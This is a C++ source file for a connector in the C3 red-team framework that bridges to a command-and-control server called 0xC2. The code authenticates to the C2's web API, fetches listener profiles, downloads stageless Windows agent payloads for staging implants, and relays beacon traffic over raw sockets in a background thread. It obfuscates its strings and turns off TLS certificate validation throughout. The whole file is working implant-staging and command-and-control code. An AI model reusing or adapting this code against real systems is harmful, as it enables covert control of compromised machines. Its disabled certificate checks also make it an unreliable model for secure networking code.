#include "StdAfx.h"
#include "Common/FSecure/Sockets/SocketsException.h"
#include "Common/json/json.hpp"
#include "Common/CppRestSdk/include/cpprest/http_client.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/Compression.h"

using json = nlohmann::json;

namespace FSecure::C3::Interfaces::Connectors
{
	/// A class representing communication with 0xC2.
	struct OhxC2 : Connector<OhxC2>
	{
		/// Public constructor.
		/// @param arguments factory arguments.
		OhxC2(ByteView arguments);

		/// A public destructor.
		~OhxC2();

		/// OnCommandFromConnector callback implementation.
		/// @param binderId Identifier of Peripheral who sends the Command.
		/// @param command full Command with arguments.
		void OnCommandFromBinder(ByteView binderId, ByteView command) override;

		/// Processes internal (C3 API) Command.
		/// @param command a buffer containing whole command and it's parameters.
		/// @return command result.
		ByteVector OnRunCommand(ByteView command) override;

		/// Called every time new implant is being created.
		/// @param connectionId adders of 0xC2Agent in C3 network .
		/// @param data parameters used to create implant. If payload is empty, new one will be generated.
		/// @param isX64 indicates if relay staging beacon is x64.
		/// @returns ByteVector correct command that will be used to stage beacon.
		ByteVector PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64) override;

		/// Return json with commands.
		/// @return Capability description in JSON format.
		static const char* GetCapability();

	private:
		/// Represents a single C3 <-> 0xC2 connection, as well as each 0xC2Agent in network.
		struct Connection : std::enable_shared_from_this<Connection>
		{
			/// Constructor.
			/// @param listeningPostAddress adders of Bridge.
			/// @param listeningPostPort port of Bridge.
			/// @param owner weak pointer to 0xC2 class.
			/// @param id id used to address 0xC2Agent.
			Connection(std::string_view listeningPostAddress, uint16_t listeningPostPort, std::weak_ptr<OhxC2> owner, std::string_view id = ""sv);

			/// Destructor.
			~Connection();

			/// Sends data directly to 0xC2.
			/// @param data buffer containing blob to send.
			/// @remarks throws FSecure::WinSocketsException on WinSockets error.
			void Send(ByteView data);

			/// Creates the receiving thread.
			/// As long as connection is alive detached thread will pull available data 0xC2.
			void StartUpdatingInSeparateThread();

			/// Reads data from Socket.
			/// @return heartbeat read data.
			ByteVector Receive();

			/// Indicates that receiving thread was already started.
			/// @returns true if receiving thread was started, false otherwise.
			bool SecondThreadStarted();

			/// Received messages from the beacon
			std::deque<ByteVector> m_RecvQueue;

		private:
			/// Pointer to TeamServer instance.
			std::weak_ptr<OhxC2> m_Owner;

			/// A socket object used in communication with the Bridge listener.
			SOCKET m_Socket;

			/// RouteID in binary form. Address of beacon in network.
			ByteVector m_Id;

			/// Indicates that receiving thread was already started.
			bool m_SecondThreadStarted = false;
		};

		/// Retrieves 0xC2Agent payload from 0xC2 using the API.
		/// @param binderId address of beacon in network.
		/// @param isX64 whether to use 64 or x86 arch
		/// @return generated payload.
		FSecure::ByteVector GeneratePayload(ByteView binderId, bool isX64);

		/// Close desired connection
		/// @arguments arguments for command. connection Id in string form.
		/// @returns ByteVector empty vector.
		FSecure::ByteVector CloseConnection(ByteView arguments);

		bool UpdateListenerId();

		bool UpdateTemplateId();

		/// Initializes Sockets library. Can be called multiple times, but requires corresponding number of calls to DeinitializeSockets() to happen before closing the application.
		/// @return value forwarded from WSAStartup call (zero if successful).
		static int InitializeSockets();

		/// Deinitializes Sockets library.
		/// @return true if successful, otherwise WSAGetLastError might be called to retrieve specific error number.
		static bool DeinitializeSockets();

		/// IP Address of Bridge Listener.
		std::string m_ListeningPostAddress;

		/// Port of Bridge Listener.
		uint16_t m_ListeningPostPort;

		///0xC2 host for web API
		std::string m_webHost;

		///0xC2 username
		std::string m_username;

		///0xC2 password
		std::string m_password;

		///0xC2 base64 encoded UDVT string
		std::string m_udvt64;
		std::string m_udvt32;

		///0xC2 pipename encoded in the udvt
		std::string m_pipename;

		///0xC2 external listener name
		std::string m_externalListenerName;

		///0xC2 listener name
		std::string m_listenerName;

		///0xC2 profile
		FSecure::json m_profile;

		///API token, generated on logon.
		std::string m_token;

		///member for 0xC2 Listener ID
		int m_ListenerId;

		/// Access mutex for m_ConnectionMap.
		std::mutex m_ConnectionMapAccess;

		/// Access mutex for sending data to 0xC2.
		std::mutex  m_SendMutex;

		/// Map of all connections.
		std::unordered_map<std::string, std::shared_ptr<Connection>> m_ConnectionMap;

	};
}

bool FSecure::C3::Interfaces::Connectors::OhxC2::UpdateListenerId()
{
	std::string url = this->m_webHost + OBF("/v1/listener");
	std::pair<std::string, uint16_t> data;
	json response;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false); //0xC2 framework is unlikely to have a valid cert.

	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
	web::http::http_request request;

	request = web::http::http_request(web::http::methods::GET);

	std::string authHeader = OBF("Bearer ") + this->m_token;
	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
	pplx::task<web::http::http_response> task = webClient.request(request);

	web::http::http_response resp = task.get();

	if (resp.status_code() != web::http::status_codes::OK)
		throw std::exception((OBF("[0xC2] Error getting Listeners, HTTP resp: ") + std::to_string(resp.status_code())).c_str());

	//Get the json response
	auto respData = resp.extract_string();
	response = json::parse(respData.get());

	bool retVal = false;
	for (auto& listeners : response)
	{
		if (listeners[OBF("name")] == m_listenerName)
		{
			this->m_ListenerId = listeners[OBF("listenerID")].get<int>();
			auto prof = listeners[OBF("profile")];
			auto profile_text = prof[OBF("windows_agent")];
			auto text = profile_text.dump();
			this->m_profile = profile_text;
			retVal = true;
		}

		if (listeners[OBF("name")] == m_externalListenerName)
		{
			this->m_ListeningPostPort = listeners[OBF("port")].get<int>();;
		}
	}

	return retVal;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::OhxC2::OhxC2(ByteView arguments)
{
	json postData;
	json response;

	std::tie(m_externalListenerName, m_listenerName, m_webHost, m_username, m_password, m_udvt64, m_udvt32, m_pipename) = arguments.Read<std::string, std::string, std::string, std::string, std::string, std::string, std::string, std::string>();

	// if the last character is '/' remove it
	if (this->m_webHost.back() == '/')
		this->m_webHost.pop_back();


	/***Authenticate to Web API ***/
	std::string url = this->m_webHost + OBF("/v1/token");

	postData[OBF("username")] = this->m_username;
	postData[OBF("secret")] = this->m_password;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false); //0xC2 framework is unlikely to have a valid cert.

	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
	web::http::http_request request;

	request = web::http::http_request(web::http::methods::POST);
	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
	request.set_body(utility::conversions::to_string_t(postData.dump()));

	pplx::task<web::http::http_response> task = webClient.request(request);
	web::http::http_response resp = task.get();

	if (resp.status_code() == web::http::status_codes::OK)
	{
		//Get the json response
		auto respData = resp.extract_string();
		response = json::parse(respData.get());
	}
	else
		throw std::exception((OBF("[0xC2] Error authenticating to web app, HTTP resp: ") + std::to_string(resp.status_code())).c_str());

	this->m_token = response[OBF("access_token")].get<std::string>();

	// TODO: If the listener doesn't already exist create it.
	if (UpdateListenerId())
	{
		InitializeSockets();
	}
	else
		throw std::exception((OBF("[0xC2] Error getting listener information.")));
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::OhxC2::~OhxC2()
{
	DeinitializeSockets();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::OhxC2::OnCommandFromBinder(ByteView binderId, ByteView command)
{
	std::scoped_lock<std::mutex> lock(m_ConnectionMapAccess);

	auto it = m_ConnectionMap.find(binderId);
	if (it == m_ConnectionMap.end())
		throw std::runtime_error{ OBF("Unknown connection") };

	if (!(it->second->SecondThreadStarted()))
	{
		it->second->StartUpdatingInSeparateThread();
	}

	it->second->m_RecvQueue.emplace_back(command);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int FSecure::C3::Interfaces::Connectors::OhxC2::InitializeSockets()
{
	WSADATA wsaData;
	WORD wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	return WSAStartup(wVersionRequested, &wsaData);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool FSecure::C3::Interfaces::Connectors::OhxC2::DeinitializeSockets()
{
	return WSACleanup() == 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::GeneratePayload(ByteView binderId, bool arch64)
{
	if (binderId.empty())
		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };

	std::string authHeader = OBF("Bearer ") + this->m_token;
	ByteVector payload;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false);
	web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + OBF("/v1/payload/windows/stageless")), config);
	web::http::http_request request;

	//The data to create an 0xC2 payload
	json postData;
	postData[OBF("p2p")] = false;
	postData[OBF("listenerID")] = this->m_ListenerId;
	postData[OBF("arch")] = arch64 ? OBF("x64") : OBF("x86");
	postData[OBF("profile")] = this->m_profile;
	if (!arch64 && m_udvt32.empty())
		throw std::runtime_error{ OBF("No 32-bit UDVT supplied for 32bit agent") };
	postData[OBF("udvt")] = arch64 ? m_udvt64 : m_udvt32; 

	try
	{
		request = web::http::http_request(web::http::methods::POST);
		request.headers().set_content_type(utility::conversions::to_string_t("application/json"));
		request.set_body(utility::conversions::to_string_t(postData.dump()));

		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
		pplx::task<web::http::http_response> task = webClient.request(request);
		web::http::http_response resp = task.get();

		if (resp.status_code() != web::http::status_codes::OK)
		{
			throw std::runtime_error(OBF("[0xC2] Non-200 HTTP code returned generating payload: ") + std::to_string(resp.status_code()));
		}

		auto payload = resp.extract_vector().get();

		//Finally connect to the socket.
		try
		{
			// Get the IP/hostname for the External connector from the supplied webhost URL
			size_t protocolEnd = m_webHost.find("://");
			size_t start = (protocolEnd != std::string::npos) ? protocolEnd + 3 : 0;
			size_t colonPos = m_webHost.find(':', start);
			if (colonPos == std::string::npos)
				m_ListeningPostAddress = m_webHost.substr(start);  // No port, return full address
			else
				m_ListeningPostAddress = m_webHost.substr(start, colonPos - start);

			auto connection = std::make_shared<Connection>(m_ListeningPostAddress, m_ListeningPostPort, std::static_pointer_cast<OhxC2>(shared_from_this()), binderId);
			m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
		}
		catch (std::exception&)
		{
			throw std::exception(OBF("[0xC2] Error connecting to 0xC2 Bridge"));
		}

		return payload;
	}
	catch (std::exception& e)
	{
		throw e;
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::CloseConnection(ByteView arguments)
{
	m_ConnectionMap.erase(arguments);
	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::OnRunCommand(ByteView command)
{
	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
		//	case 0:
		//		return GeneratePayload(command);
	case 1:
		return CloseConnection(command);
	default:
		return AbstractConnector::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Connectors::OhxC2::GetCapability()
{
	return R"(
	{
	"create":
	{
		"arguments":
		[
			{
				"type": "string",
				"name": "0xC2 External Listener Name",
				"min": 1,
				"defaultValue": "ExternalC3",
				"description": "The name of the EXTERNAL listener within 0xC2."
			},
			{
				"type": "string",
				"name": "0xC2 Listener Name",
				"min": 1,
				"defaultValue": "C3",
				"description": "The name of the standard listener within 0xC2."
			},
			{
				"type": "string",
				"name": "0xC2 Web Host",
				"min": 1,
				"defaultValue": "https://127.0.0.1:5000/",
				"description": "Host for 0xC2 - eg https://127.0.0.1:5000/"
			},
			{
				"type": "string",
				"name": "Username",
				"min": 1,
				"defaultValue": "extc3",
				"description": "Username to authenticate"
			},
			{
				"type": "string",
				"name": "Password",
				"min": 1,
				"description": "Password to authenticate"
			},
			{
				"type": "string",
				"name": "UDVT64",
				"min": 1,
				"description": "Base64 encoded UDVT to force C3 communication."
			},
			{
				"type": "string",
				"name": "UDVT86",
				"min": 0,
				"description": "Base64 encoded UDVT to force C3 communication (not mandatory)."
			},
			{
				"type": "string",
				"name": "Pipename",
				"default": "test",
				"min": 4,
				"description": "Pipename compiled in the UDVT"
			}
		]
	},
	"commands":
	[
		{
			"name": "Close connection",
			"description": "Close socket connection with TeamServer if beacon is not available",
			"id": 1,
			"arguments":
			[
				{
					"name": "Route Id",
					"min": 1,
					"description": "Id associated to beacon"
				}
			]
		}
	]
}
)";
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::OhxC2::Connection::Connection(std::string_view listeningPostAddress, uint16_t listeningPostPort, std::weak_ptr<OhxC2> owner, std::string_view id)
	: m_Owner(owner)
	, m_Id(ByteView{ id })
{

	/*** Connect to C2Bridge ***/
	sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(listeningPostPort);
	switch (InetPtonA(AF_INET, &listeningPostAddress.front(), &client.sin_addr.s_addr))			//< Mod to solve deprecation issue.
	{
	case 0:
		throw std::invalid_argument(OBF("Provided Listening Post address in not a valid IPv4 dotted - decimal string or a valid IPv6 address."));
	case -1:
		throw FSecure::SocketsException(OBF("Couldn't convert standard text IPv4 or IPv6 address into its numeric binary form. Error code : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
	}

	// Attempt to connect.
	if (INVALID_SOCKET == (m_Socket = socket(AF_INET, SOCK_STREAM, 0)))
		throw FSecure::SocketsException(OBF("Couldn't create socket."), WSAGetLastError());

	if (SOCKET_ERROR == connect(m_Socket, (struct sockaddr*)&client, sizeof(client)))
		throw FSecure::SocketsException(OBF("Could not connect to ") + std::string{ listeningPostAddress } + OBF(":") + std::to_string(listeningPostPort) + OBF("."), WSAGetLastError());

}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::OhxC2::Connection::~Connection()
{
	closesocket(m_Socket);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::OhxC2::Connection::Send(ByteView data)
{
	auto owner = m_Owner.lock();
	if (!owner)
		throw std::runtime_error(OBF("Could not lock pointer to owner "));

	std::unique_lock<std::mutex> lock{ owner->m_SendMutex };
	// Write four bytes indicating the length of the next chunk of data.
	DWORD chunkLength = static_cast<DWORD>(data.size());
	if (SOCKET_ERROR == send(m_Socket, reinterpret_cast<char*>(&chunkLength), 4, 0))
		throw FSecure::SocketsException(OBF("Error sending to Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());

	// Write the chunk to socket.
	if (SOCKET_ERROR == send(m_Socket, reinterpret_cast<const char*>(&data.front()), static_cast<int>(chunkLength), 0))
		throw FSecure::SocketsException(OBF("Error sending to Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::Connection::Receive()
{
	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(m_Socket, &readSet);

	TIMEVAL timeout = { 0, 0 }; // Non-blocking check

	if (select(0, &readSet, nullptr, nullptr, &timeout) <= 0)
		return {}; // No data available

	DWORD chunkLength = 0;
	int bytesRead = recv(m_Socket, reinterpret_cast<char*>(&chunkLength), 4, 0);
	if (bytesRead == SOCKET_ERROR)
		throw FSecure::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + ".", WSAGetLastError());

	if (!bytesRead || !chunkLength)
		return {}; // Connection closed or empty message

	FSecure::ByteVector buffer(chunkLength);
	DWORD bytesReadTotal = 0;

	while (bytesReadTotal < chunkLength)
	{
		FD_ZERO(&readSet);
		FD_SET(m_Socket, &readSet);

		if (select(0, &readSet, nullptr, nullptr, &timeout) <= 0)
			break; // No more data available right now

		int result = recv(m_Socket, reinterpret_cast<char*>(&buffer[bytesReadTotal]), chunkLength - bytesReadTotal, 0);
		if (result == 0)
			return {}; // Connection closed
		if (result == SOCKET_ERROR)
			throw FSecure::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + ".", WSAGetLastError());

		bytesReadTotal += result;
	}

	return buffer;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::OhxC2::Connection::StartUpdatingInSeparateThread()
{
	m_SecondThreadStarted = true;
	std::thread([this]()
		{
			// Lock pointers.
			auto owner = m_Owner.lock();
			auto bridge = owner->GetBridge();
			auto self = shared_from_this();

			while (bridge->IsAlive() && self.use_count() > 1)
			{
				std::this_thread::sleep_for(std::chrono::milliseconds{ 10 });
				try
				{
					if (!m_RecvQueue.empty())
					{
						auto msg = std::move(m_RecvQueue.front());
						m_RecvQueue.pop_front();
						Send(msg);
					}

					// Read packet and post it to Binder.
					if (auto packet = Receive(); !packet.empty())
					{
						// Don't forward NoOps over C3
						// TODO is this safe enough?
						// Agent doesn't seem to care if it receives this or not.
						if (packet.size() != 60u)
						{
							// Send valid Commands over C3
							bridge->PostCommandToBinder(m_Id, packet);
						}
					}
				}
				catch (std::exception& e)
				{
					bridge->Log({ e.what(), LogMessage::Severity::Error });
				}
			}
		}).detach();
}

bool FSecure::C3::Interfaces::Connectors::OhxC2::Connection::SecondThreadStarted()
{
	return m_SecondThreadStarted;
}

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64)
{
	auto [maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls] = data.Read<uint16_t, uint16_t, bool>();
	return ByteVector{}.Write(m_pipename, maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls, GeneratePayload(connectionId, isX64));
}


